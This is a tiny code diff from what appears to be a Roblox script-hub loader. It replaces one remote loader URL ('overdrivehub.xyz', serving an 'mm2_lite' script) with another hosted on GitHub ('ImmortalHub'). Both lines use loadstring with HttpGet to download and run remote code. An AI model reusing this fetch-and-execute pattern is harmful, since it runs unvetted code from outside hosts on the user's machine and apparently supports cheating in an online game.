@@ -55,4 +55,5 @@ repeat
     task.wait()
 until fr
 
-loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/ImmortalHub/refs/heads/main/loader.lua", true))()
+
